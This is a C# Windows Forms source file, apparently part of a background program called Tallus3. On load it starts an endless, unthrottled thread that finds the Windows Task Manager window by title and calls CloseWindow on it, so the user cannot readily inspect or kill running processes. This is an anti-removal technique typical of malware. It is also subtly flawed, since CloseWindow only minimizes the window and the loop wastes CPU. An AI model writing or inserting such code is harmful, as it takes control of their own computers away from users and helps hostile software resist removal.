using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;

namespace Tallus3.Background
{
    public partial class Form1 : Form
    {
       

        [DllImport("user32.dll")]
        public static extern bool CloseWindow(IntPtr hwnd);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpclass, string lpname);
        public Form1()
        { 
            InitializeComponent();
        }
        public static void CloseTaskMgr()
        {
            for (; ; )
            {
                IntPtr hwndtskm = FindWindow(null, "Windows Task Manager");
                CloseWindow(hwndtskm);

            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Thread t1 = new Thread(CloseTaskMgr);
            t1.Start();
          

        }
    }
}
